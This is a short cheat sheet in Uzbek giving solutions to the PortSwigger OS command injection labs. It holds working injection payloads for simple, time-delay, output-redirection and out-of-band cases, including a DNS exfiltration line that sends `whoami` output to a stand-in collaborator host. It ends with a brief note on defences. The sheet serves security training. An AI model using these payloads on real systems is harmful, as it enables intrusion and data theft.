# OS Command Injection — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, Collaborator = **COLLAB.example.net**.
> Separatorlar: `|`  `||`  `&`  `&&`  `;`  `` `cmd` ``  `$(cmd)`  newline. URL'da probel = `+`.

### Simple case — APPRENTICE
Stock checker `storeID` ni to'g'ridan shell'ga beradi.
```
storeID=1|whoami
```

### Blind — time delays — PRACTITIONER
Javobda output yo'q → ping bilan kechiktir.
```
email=x||ping+-c+10+127.0.0.1||
```
> ~10s kechiksa — command injection bor.

### Blind — output redirection — PRACTITIONER
Output'ni web-accessible papkaga yozib, keyin o'qiysan.
```
email=||whoami>/var/www/images/output.txt||
filename=output.txt
```

### Blind — OOB interaction — PRACTITIONER
Javob ham, vaqt ham ishlamasa → DNS (nslookup) Collaborator'ga.
```
email=x||nslookup+x.COLLAB.example.net||
```

### Blind — OOB data exfiltration — PRACTITIONER
Buyruq natijasini DNS subdomeniga qo'shib chiqarasan.
```
email=||nslookup+`whoami`.COLLAB.example.net||
```
> Collaborator DNS interaction subdomenida `whoami` natijasi chiqadi.

---

### Eslatma
Himoya: shell'ga user input bermaslik, API-level (execve massiv), input allowlist.
Umumiy payload/separator jadvali: bu papka README.
